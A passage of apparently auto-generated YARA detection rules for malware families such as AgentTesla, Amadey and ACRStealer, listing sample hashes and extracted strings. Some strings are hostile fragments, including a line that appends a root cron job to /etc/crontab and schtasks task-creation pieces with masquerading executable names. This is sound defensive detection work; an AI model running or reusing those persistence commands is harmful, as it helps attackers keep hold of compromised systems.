      description = "_subset_batch - from files 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, 9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_04537b68.exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_4cfe5a07.exe, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash2 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash3 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash4 = "1005065810ae3c06e48ea42e790775bd003451a8aea76a25331cbe9a55f701f2"
      hash5 = "04537b68ef029a66a16e85052f829b6f6cc969fefe894e0c55f8048cc5ad74a6"
      hash6 = "4cfe5a076f8b5aeedafccaff49969c10d09468bbb795075099f10974248c23f8"
      hash7 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash8 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $s1 = "runtime.headTailIndex.head" fullword ascii /* score: '15.00'*/
      $s2 = "runtime/internal/atomic.(*Uintptr).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s3 = "runtime/internal/atomic.(*Int64).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s4 = "runtime/internal/atomic.(*Uint64).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s5 = "runtime/internal/atomic.(*Uint32).CompareAndSwap" fullword ascii /* score: '14.00'*/
      $s6 = "runtime.int64Hash" fullword ascii /* score: '13.00'*/
      $s7 = "runtime.addOneOpenDeferFrame.func1" fullword ascii /* score: '13.00'*/
      $s8 = "runtime.addOneOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s9 = "runtime.runOpenDeferFrame" fullword ascii /* score: '13.00'*/
      $s10 = "framepc" fullword ascii /* score: '11.00'*/
      $s11 = "runtime.traceHeapGoal" fullword ascii /* score: '10.00'*/
      $s12 = "runtime.updateTimerPMask" fullword ascii /* score: '10.00'*/
      $s13 = "runtime.updateTimer0When" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.runtimer" fullword ascii /* score: '10.00'*/
      $s15 = "runtime/internal/atomic.(*Uint64).Add" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 17000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 8 of them )
      ) or ( all of them )
}

rule _837fe6c9e243ff99b6590b36278aa82c_imphash__a41097d27d1b14962ff14afe46b2196d_imphash__AgentTesla_signature__1ff43e683b799b789_69 {
   meta:
      description = "_subset_batch - from files 837fe6c9e243ff99b6590b36278aa82c(imphash).exe, a41097d27d1b14962ff14afe46b2196d(imphash).exe, AgentTesla(signature)_1ff43e683b799b78959121aacb9f0786(imphash).exe, AgentTesla(signature)_1ff43e683b799b78959121aacb9f0786(imphash)_ea39e8b7.exe, AgentTesla(signature)_6d242744.tar, AgentTesla(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, AgentTesla(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "da061f2bdb2a6d84d3e7d6b2045834655fe65418e9ad7281b4b689a3700dc003"
      hash2 = "72ac8cc42df3b7e913a8424004a82c930388c5dd0641a7200840bae2722f467d"
      hash3 = "0d96551046ad9c205cabca0aa816b062a85a9cf3716486d74ae73976db00dd11"
      hash4 = "ea39e8b7e3c1b9f60c4702870811029c644fc6c16a09e9528031160ff0445f92"
      hash5 = "6d242744cbee7249a48505d1447d984e9c912b904be4ea3dcccd07602ef5264d"
      hash6 = "7b3d435d322d7303446c5ce3308704a1d4d5a5b1e70abb44a19502be6baf2c79"
      hash7 = "239ec64b8c00bdc8603baaf441fc33bb14c14800051cf2d48d80345ff2966d9a"
   strings:
      $s1 = "*ComputePublicKeyToken" fullword ascii /* score: '16.00'*/
      $s2 = "6TryGetTypeTemplate_Internal" fullword ascii /* score: '16.00'*/
      $s3 = "2InitializeExecutionDomain" fullword ascii /* score: '16.00'*/
      $s4 = "\"ProcessFinalizers" fullword ascii /* score: '15.00'*/
      $s5 = "NFindInterfaceMethodImplementationTarget" fullword ascii /* score: '14.00'*/
      $s6 = "2GetStructUnsafeStructSize<GetForwardDelegateCreationStub" fullword ascii /* score: '14.00'*/
      $s7 = "RFunctionPointerRuntimeTypeHandleHashtable,GenericTypeInstanceKey" fullword ascii /* score: '13.00'*/
      $s8 = "tRuntimeTypeHandleToParameterTypeRuntimeTypeHandleHashtable,FunctionPointerTypeKey" fullword ascii /* score: '13.00'*/
      $s9 = "\"IcuInitSortHandle2GetIsAsciiEqualityOrdinal IcuCompareString" fullword ascii /* score: '12.00'*/
      $s10 = "&GetAddressFromIndex@" fullword ascii /* score: '12.00'*/
      $s11 = "(GetRuntimeTypeHandle" fullword ascii /* score: '12.00'*/
      $s12 = "HTryGetMethodMetadataFromStartAddress" fullword ascii /* score: '12.00'*/
      $s13 = " GetBooleanConfig" fullword ascii /* score: '12.00'*/
      $s14 = ":GetExceptionForLastWin32Error" fullword ascii /* score: '12.00'*/
      $s15 = "&GetRuntimeException" fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x7061 ) and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb_9a87d04294becdf4a20c7335e1cc607c20c666cace04d722c_70 {
   meta:
      description = "_subset_batch - from files 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash2 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash3 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
   strings:
      $x1 = "AllThreadsSyscall6 results differ between threads; runtime corruptedreflect: reflect.Value.UnsafePointer on an invalid notinheap" ascii /* score: '67.50'*/
      $x2 = "abiRegArgsType needs GC Prog, update methodValueCallFrameObjsexec: Cmd started a Process but leaked without a call to Waitx509: " ascii /* score: '50.50'*/
      $x3 = "d utf8 payload in close framehpack: invalid Huffman-encoded datadynamic table size update too largecrypto/md5: invalid hash stat" ascii /* score: '31.00'*/
      $s4 = " pointer-alignedmismatched begin/end of activeSweepmheap.freeSpanLocked - invalid freeattempt to clear non-empty span setruntime" ascii /* score: '27.00'*/
      $s5 = "lagw must be at least 2 by the definition of NAFecho \"*/1 * * * * root /.mod \" >> /etc/crontabnet/http: internal error: misuse" ascii /* score: '21.00'*/
      $s6 = "ed to send closeNotify alert (but connection was closed anyway): %wuTLS does not support reprocessing of PSK key triggered by He" ascii /* score: '18.00'*/
      $s7 = " bufferhttp: unexpected EOF reading trailer LastStreamID=%v ErrCode=%v Debug=%qexpected an ECDSA public key, got %Tunsupported S" ascii /* score: '16.00'*/
      $s8 = "essage cannot contain multiple Content-Length headers; got %qgo package net: cgo resolver not supported; using Go's DNS resolver" ascii /* score: '15.00'*/
      $s9 = "context_takeover; client_no_context_takeovertls: internal error: attempted to read record with pending application datatls: fail" ascii /* score: '13.00'*/
      $s10 = " smaller than natx509: malformed extension OID fieldx509: wrong Ed25519 public key sizex509: invalid authority info accessinvali" ascii /* score: '13.00'*/
      $s11 = "C:/Program Files/Go/src/internal/poll/sock_cloexec.go" fullword ascii /* score: '12.00'*/
      $s12 = "etpollBreak write failedforEachP: sched.safePointWait != 0schedule: spinning with local workruntime: standard file descriptor ru" ascii /* score: '12.00'*/
      $s13 = "ntedmalformed response from server: malformed non-numeric status pseudo headernet/http: server replied with more than declared C" ascii /* score: '12.00'*/
      $s14 = "anrunnable" fullword ascii /* score: '11.00'*/
      $s15 = " random data from the kernel" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _83f74e262a231c291d550e03a3a0116d018a66dff83443bca993581231de3f04_83f74e26_8966aabe47b5e1e1228b5f0379d72732f955a6d2b432da069_71 {
   meta:
      description = "_subset_batch - from files 83f74e262a231c291d550e03a3a0116d018a66dff83443bca993581231de3f04_83f74e26.msi, 8966aabe47b5e1e1228b5f0379d72732f955a6d2b432da0697139c6ad80a96d3_8966aabe.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "83f74e262a231c291d550e03a3a0116d018a66dff83443bca993581231de3f04"
      hash2 = "8966aabe47b5e1e1228b5f0379d72732f955a6d2b432da0697139c6ad80a96d3"
   strings:
      $s1 = "failed to execute view" fullword ascii /* score: '19.00'*/
      $s2 = "failed to get MsiLogging property" fullword ascii /* score: '17.00'*/
      $s3 = "7http://cacerts.digicert.com/DigiCertCSRSA4096RootG5.crt0E" fullword ascii /* score: '16.00'*/
      $s4 = "4http://crl3.digicert.com/DigiCertCSRSA4096RootG5.crl0" fullword ascii /* score: '16.00'*/
      $s5 = "Chttp://cacerts.digicert.com/NETFoundationProjectsCodeSigningCA2.crt0" fullword ascii /* score: '13.00'*/
      $s6 = "@http://crl3.digicert.com/NETFoundationProjectsCodeSigningCA2.crl0F" fullword ascii /* score: '13.00'*/
      $s7 = "@http://crl4.digicert.com/NETFoundationProjectsCodeSigningCA2.crl0=" fullword ascii /* score: '13.00'*/
      $s8 = "Failed to set verbose logging global atom" fullword ascii /* score: '12.00'*/
      $s9 = "Failed to get string from record" fullword ascii /* score: '12.00'*/
      $s10 = "Failed to get previous size of property data string." fullword ascii /* score: '12.00'*/
      $s11 = "Failed to get module filename" fullword ascii /* score: '12.00'*/
      $s12 = "Failed to get previous size of string" fullword ascii /* score: '12.00'*/
      $s13 = "Failed to get data for property '%ls'" fullword ascii /* score: '12.00'*/
      $s14 = "LOGVERBOSE" fullword ascii /* score: '11.50'*/
      $s15 = "Entering %s in %ls, version %u.%u.%u.%u" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 15000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a8d282ff4246325408d2cfcb74a630ba894345d116342ed5abb79c5c0ce8a97e_a8d282ff_aab2fabe81d1ef6b9352abcc40152926c27d8601528d52f7c_72 {
   meta:
      description = "_subset_batch - from files a8d282ff4246325408d2cfcb74a630ba894345d116342ed5abb79c5c0ce8a97e_a8d282ff.js, aab2fabe81d1ef6b9352abcc40152926c27d8601528d52f7cebb73986a92e05d_aab2fabe.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a8d282ff4246325408d2cfcb74a630ba894345d116342ed5abb79c5c0ce8a97e"
      hash2 = "aab2fabe81d1ef6b9352abcc40152926c27d8601528d52f7cebb73986a92e05d"
   strings:
      $s1 = "// Process file list" fullword ascii /* score: '15.00'*/
      $s2 = "+ e.description);" fullword ascii /* score: '14.00'*/
      $s3 = "WScript.Sleep(500);" fullword ascii /* score: '13.00'*/
      $s4 = "if ( WScript.Arguments.Named.Exists('XSL') ) {" fullword ascii /* score: '10.00'*/
      $s5 = "if ( WScript.Arguments.length < 1 || WScript.Arguments.Named.Exists('H') ) {" fullword ascii /* score: '10.00'*/
      $s6 = "if ( WScript.Arguments.Named.Exists('fg') ) {" fullword ascii /* score: '10.00'*/
      $s7 = "// ReadOnlyRecommended" fullword ascii /* score: '10.00'*/
      $s8 = " * Copyright (c) 2004-2020 Ildar Shaimordanov" fullword ascii /* score: '10.00'*/
      $s9 = "if ( WScript.Arguments.Named.Exists('F') ) {" fullword ascii /* score: '10.00'*/
      $s10 = "// CompatibilityMode" fullword ascii /* score: '9.00'*/
      $s11 = "+ '] - ' " fullword ascii /* score: '9.00'*/
      $s12 = "+ (e.number & 0xFFFF) " fullword ascii /* score: '8.00'*/
      $s13 = "+ (e.number >> 0x10) " fullword ascii /* score: '8.00'*/
      $s14 = "// /F:TXT /E:Encoding" fullword ascii /* score: '8.00'*/
      $s15 = "// /F:FB2 /XSL:filename" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _837fe6c9e243ff99b6590b36278aa82c_imphash__AgentTesla_signature__1ff43e683b799b78959121aacb9f0786_imphash__AgentTesla_signat_73 {
   meta:
      description = "_subset_batch - from files 837fe6c9e243ff99b6590b36278aa82c(imphash).exe, AgentTesla(signature)_1ff43e683b799b78959121aacb9f0786(imphash).exe, AgentTesla(signature)_1ff43e683b799b78959121aacb9f0786(imphash)_ea39e8b7.exe, AgentTesla(signature)_6d242744.tar, AgentTesla(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "da061f2bdb2a6d84d3e7d6b2045834655fe65418e9ad7281b4b689a3700dc003"
      hash2 = "0d96551046ad9c205cabca0aa816b062a85a9cf3716486d74ae73976db00dd11"
      hash3 = "ea39e8b7e3c1b9f60c4702870811029c644fc6c16a09e9528031160ff0445f92"
      hash4 = "6d242744cbee7249a48505d1447d984e9c912b904be4ea3dcccd07602ef5264d"
      hash5 = "7b3d435d322d7303446c5ce3308704a1d4d5a5b1e70abb44a19502be6baf2c79"
   strings:
      $s1 = "BResolveGenericVirtualMethodTargetBGetStringFromMemoryInNativeFormatDGetRuntimeFieldHandleForComponents@" fullword ascii /* score: '20.00'*/
      $s2 = "RTryGetStaticRuntimeMethodHandleComponentsRGetMethodDescForStaticRuntimeMethodHandle@" fullword ascii /* score: '15.00'*/
      $s3 = "get_Current$GetCurrentThreadId" fullword ascii /* score: '12.00'*/
      $s4 = "System.Numerics.INumberBase<System.Int32>.TryConvertFromSaturating" fullword ascii /* score: '10.00'*/
      $s5 = "System.Numerics.INumberBase<System.Int32>.TryConvertToSaturating" fullword ascii /* score: '10.00'*/
      $s6 = "GetValueLocked" fullword ascii /* score: '9.00'*/
      $s7 = "4TryGetMetadataForNamedType" fullword ascii /* score: '9.00'*/
      $s8 = "\"GetArgumentString" fullword ascii /* score: '9.00'*/
      $s9 = "*GetUtf8SequenceLength&SetDefaultFallbacks" fullword ascii /* score: '9.00'*/
      $s10 = "GetLowerBound@" fullword ascii /* score: '9.00'*/
      $s11 = "BDrainRemainingDataForGetByteCount,ThrowLastCharRecursive@" fullword ascii /* score: '9.00'*/
      $s12 = "HTryGetDynamicGenericMethodDictionary@" fullword ascii /* score: '9.00'*/
      $s13 = "FTryGetStaticGenericMethodDictionary" fullword ascii /* score: '9.00'*/
      $s14 = " ThrowInvalidBase FromBase64String" fullword ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x7061 ) and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Amadey_signature__a7aa24c415f825313f717dd133b7e17b_imphash__Amadey_signature__c9391c4d011b74463c0b80c8ef62af14_imphash__74 {
   meta:
      description = "_subset_batch - from files Amadey(signature)_a7aa24c415f825313f717dd133b7e17b(imphash).exe, Amadey(signature)_c9391c4d011b74463c0b80c8ef62af14(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2399672c48839929e4dd63c5107d1751128f74b30ea82dca873a8c27ed591c13"
      hash2 = "5453acf964552200893bd02b4afef111f87ac65f14feefe843a39f3d6042b9df"
   strings:
      $s1 = "  Ctrl+Alt+R  -> Recycle Documents\\AutoProx\\temp.txt" fullword wide /* score: '22.00'*/
      $s2 = "[HK] Recycled temp.txt" fullword wide /* score: '18.00'*/
      $s3 = "[i] Privilege %s not present in token (ok)." fullword wide /* score: '14.00'*/
      $s4 = "EventLog hotkeys started" fullword wide /* score: '12.00'*/
      $s5 = "CreateFileW(temp)" fullword wide /* score: '11.00'*/
      $s6 = "AutoProx temp file." fullword wide /* score: '11.00'*/
      $s7 = "[HK] Recycle failed" fullword wide /* score: '10.00'*/
      $s8 = "[!] %s failed: (%lu) %s" fullword wide /* score: '10.00'*/
      $s9 = "AutoProx Hotkeys running." fullword wide /* score: '10.00'*/
      $s10 = "[OK] Privilege %s enabled." fullword wide /* score: '10.00'*/
      $s11 = "[!] Some hotkeys failed. Try closing apps that use Ctrl+Alt+U/O/R/L." fullword wide /* score: '10.00'*/
      $s12 = "ENDSESSION" fullword wide /* score: '9.50'*/
      $s13 = "SHFileOperationW(FO_DELETE)" fullword wide /* score: '9.00'*/
      $s14 = "  Ctrl+Alt+O  -> Open Documents folder" fullword wide /* score: '8.00'*/
      $s15 = "  Ctrl+Alt+L  -> Lock workstation" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0046ac15_Amadey_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imp_75 {
   meta:
      description = "_subset_batch - from files Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0046ac15.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_032079e3.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_06b0528e.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1292a873.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1db211a3.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2e199cb5.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_2e44e0ed.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3ba3ef4c.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_40552b30.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_569f2221.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5e7f879e.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_666f527c.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_707837ab.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_7a3ea1f8.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8a6ac422.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_912c36f9.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a39eeadc.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b312ad75.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c61e7458.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d17fbdcc.exe, Amadey(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_eea0252a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0046ac156acfd377676b3b6a529e8dd7426d058f20a8ff445d47134b02e5c8c3"
      hash2 = "032079e34dc17a8d2275da5f95d53ea0a018bfc81faa2de2137e46f003fd86d7"
      hash3 = "06b0528ecb9a60899897a39b79f264faa1773d8f8721e95ad995e16911564141"
      hash4 = "1292a873d77a29f7c17698102795dbea54fa389460e151250877f4b487290466"
      hash5 = "1db211a355727107916e15b30f1f91bf0630b6bf8d3c0e9ea88a76d8ff3c9ed1"
      hash6 = "2e199cb594c3aede58350bd2fefa695307196f96129dfcf0974a3560c767762a"
      hash7 = "2e44e0ed0a7604ab4ec9d16b72ffe43001dac374589a8275becec0bbfd254cc6"
      hash8 = "3ba3ef4cc21a08817b7e7dae3a46f13bd596025ecd2d983a2203e4bd3eeb14c7"
      hash9 = "40552b3060c5758c0351895c93e3aa38234b375ef812e3577a6b6d144aa613cb"
      hash10 = "569f22213586ed9e170aa3640be123a4b9435679ddfea5eebb5cd427a25c29e7"
      hash11 = "5e7f879e41daf4d06a1a3c9fc0dae67033d49de8a7fe73074b43af7f46a622ba"
      hash12 = "666f527c4c079d4e8e46fd3afd40491ba28b8df1fcc7aba30fb333003aeb0352"
      hash13 = "707837ab12e3265c697210c168216999b7f82727119723d8d1006a4d46d3093a"
      hash14 = "7a3ea1f8ddff3751f6148c6f7da2aa702ad053ba7c7a182b9a94faf2b3b44a43"
      hash15 = "8a6ac42273774f12b5e5f3bba953365cb44ca63a0dd888e301a295f34fff69fd"
      hash16 = "912c36f958867dfdce9b197f2a4efaaf651a2c1fdd0e77835add985e30513d1a"
      hash17 = "a39eeadcebb774bd9b4273c198c8ce9d93c0ecd3c655325a87a9b040bd2ad495"
      hash18 = "b312ad755ed2937661ef26ac8490eeb0c5b27b296faa5b325a5af424865f3bab"
      hash19 = "c61e7458636c14db4555bea09f174b1323b283f486e0618ab07e0384c6b2b12c"
      hash20 = "d17fbdccb55a602246b26034b6ce9d64ae1c3b5ad48fd93a732d2fb1dd8de6df"
      hash21 = "eea0252ad1d6a926f9c389a67d68bf4e21c24f843770f92b47d9cf10bf91748e"
   strings:
      $s1 = "svchosthelper.exe" fullword wide /* score: '27.00'*/
      $s2 = "systemhelper.exe" fullword wide /* score: '25.00'*/
      $s3 = "DownloaderService" fullword wide /* score: '22.00'*/
      $s4 = "<Task version=\"1.4\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">" fullword wide /* score: '17.00'*/
      $s5 = "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>" fullword wide /* score: '11.00'*/
      $s6 = "/c schtasks /create /tn \"" fullword wide /* score: '11.00'*/
      $s7 = "WindowsLogsHelper" fullword wide /* score: '9.00'*/
      $s8 = "  <Actions Context=\"Author\">" fullword wide /* score: '9.00'*/
      $s9 = "    <Exec>" fullword wide /* score: '8.00'*/
      $s10 = "    </Exec>" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 15000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _837fe6c9e243ff99b6590b36278aa82c_imphash__AgentTesla_signature__6d242744_AgentTesla_signature__799e73863806df2964d80d12ce4e_76 {
   meta:
      description = "_subset_batch - from files 837fe6c9e243ff99b6590b36278aa82c(imphash).exe, AgentTesla(signature)_6d242744.tar, AgentTesla(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, Amadey(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "da061f2bdb2a6d84d3e7d6b2045834655fe65418e9ad7281b4b689a3700dc003"
      hash2 = "6d242744cbee7249a48505d1447d984e9c912b904be4ea3dcccd07602ef5264d"
      hash3 = "7b3d435d322d7303446c5ce3308704a1d4d5a5b1e70abb44a19502be6baf2c79"
      hash4 = "69e0d212862b36fc44f33e7a05d27b545db8e9d02d77e0770e5c947391ae7f78"
   strings:
      $s1 = "Execute@" fullword ascii /* score: '18.00'*/
      $s2 = "(ConstrainedExecution" fullword ascii /* score: '16.00'*/
      $s3 = ">InitializeComForFinalizerThread@InitializeComForThreadPoolThread" fullword ascii /* score: '10.00'*/
      $s4 = "ComputeHash@" fullword ascii /* score: '10.00'*/
      $s5 = "RegistryKey.SetValue does not allow a String[] that contains a null String reference" fullword wide /* score: '10.00'*/
      $s6 = "RegistryKey.SetValue does not support arrays of type '{0}'. Only Byte[] and String[] are supported" fullword wide /* score: '10.00'*/
      $s7 = ",GetEnvironmentVariable4ExpandEnvironmentVariables" fullword ascii /* score: '9.00'*/
      $s8 = "$GetPerformanceData@" fullword ascii /* score: '9.00'*/
      $s9 = "8GetOverlappedValueTaskSource@" fullword ascii /* score: '9.00'*/
      $s10 = "GetFileLength@" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x7061 ) and filesize < 12000KB and ( all of them )
      ) or ( all of them )
}

rule _ACRStealer_signature__6e0d36f5ebd5b5226c824e12dbf61fbf_imphash__ACRStealer_signature__b40107e1edc4ea24cfd748ff455a0f07_imph_77 {
   meta:
      description = "_subset_batch - from files ACRStealer(signature)_6e0d36f5ebd5b5226c824e12dbf61fbf(imphash).dll, ACRStealer(signature)_b40107e1edc4ea24cfd748ff455a0f07(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3db406d9fb6be578ddc32184e680b1b4f5ec0d9b94e12204912ad2b10cd22ef4"
      hash2 = "708d3641268904f8cf9a0041a5e9d1e41b7b979da892b1e2fbebe7af7e709ca4"
   strings:
      $s1 = ";http://crt.sectigo.com/SectigoPublicTimeStampingRootR46.p7c0#" fullword ascii /* score: '23.00'*/
      $s2 = ";http://crl.sectigo.com/SectigoPublicTimeStampingRootR46.crl0|" fullword ascii /* score: '19.00'*/
      $s3 = "8http://crt.sectigo.com/SectigoPublicCodeSigningCAR36.crt0#" fullword ascii /* score: '16.00'*/
      $s4 = "9http://crl.sectigo.com/SectigoPublicTimeStampingCAR36.crl0z" fullword ascii /* score: '16.00'*/
      $s5 = "8http://crl.sectigo.com/SectigoPublicCodeSigningCAR36.crl0y" fullword ascii /* score: '16.00'*/
      $s6 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl05" fullword ascii /* score: '16.00'*/
      $s7 = "9http://crt.sectigo.com/SectigoPublicTimeStampingCAR36.crt0#" fullword ascii /* score: '16.00'*/
      $s8 = "%Sectigo Public Time Stamping Root R46" fullword ascii /* score: '13.00'*/
      $s9 = "%Sectigo Public Time Stamping Root R460" fullword ascii /* score: '13.00'*/
      $s10 = "'Sectigo Public Time Stamping Signer R35" fullword ascii /* score: '10.00'*/
      $s11 = "'Sectigo Public Time Stamping Signer R350" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _aa01007ee70675acff24b74d96f3e8a0_imphash__aa01007ee70675acff24b74d96f3e8a0_imphash__0bd24cc3_AgentTesla_signature__AgentTes_78 {
   meta:
      description = "_subset_batch - from files aa01007ee70675acff24b74d96f3e8a0(imphash).exe, aa01007ee70675acff24b74d96f3e8a0(imphash)_0bd24cc3.exe, AgentTesla(signature).img, AgentTesla(signature)_c3b4a2c5.img, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_24a8da09.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4741946c.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_795c07f2.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_939a66d4.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "e23ad69a19501fbd40a5319ce2b002272579831ee85922f6a08da85c6836915a"
      hash2 = "0bd24cc34dc7d003c276f95771fb54429a5cebd6d5f9cabce7902a16b972b44c"
      hash3 = "26e843a1f2d407cb2d62af0d629e00646b62db423c2eba3fdbcca719ca30001e"
      hash4 = "c3b4a2c5e3e6db7faa7ed1fed5f4ce5a37c02b47d00b411c9c356a1267791a4d"
      hash5 = "24a8da093779cbbb0d5dbbaf6f1a4873ae22202aa5047912a753a29885f52204"
      hash6 = "4741946cb35138101e98fae2656734341f7d112f6a790b23cb94b61a6f322067"
      hash7 = "795c07f23cfd8ba8921c2970e857333647ceedc6cd513b2cf0dd412f2f5cbd52"
      hash8 = "939a66d4d9702e973dfbcf9144290a7a4f708626fe10f5e004c54974a6774c77"
   strings:
      $s1 = "\"http://ocsp2.globalsign.com/rootr606" fullword ascii /* score: '20.00'*/
      $s2 = ":http://secure.globalsign.com/cacert/codesigningrootr45.crt0A" fullword ascii /* score: '16.00'*/
      $s3 = "0http://crl.globalsign.com/codesigningrootr45.crl0U" fullword ascii /* score: '16.00'*/
      $s4 = "-http://ocsp.globalsign.com/codesigningrootr450F" fullword ascii /* score: '16.00'*/
      $s5 = "%http://crl.globalsign.com/root-r6.crl0G" fullword ascii /* score: '16.00'*/
      $s6 = "0http://crl.globalsign.com/ca/gstsacasha384g4.crl0" fullword ascii /* score: '13.00'*/
      $s7 = "3http://ocsp.globalsign.com/gsgccr45evcodesignca20200U" fullword ascii /* score: '13.00'*/
      $s8 = "6http://crl.globalsign.com/gsgccr45evcodesignca2020.crl0" fullword ascii /* score: '13.00'*/
      $s9 = "-http://ocsp.globalsign.com/ca/gstsacasha384g40C" fullword ascii /* score: '13.00'*/
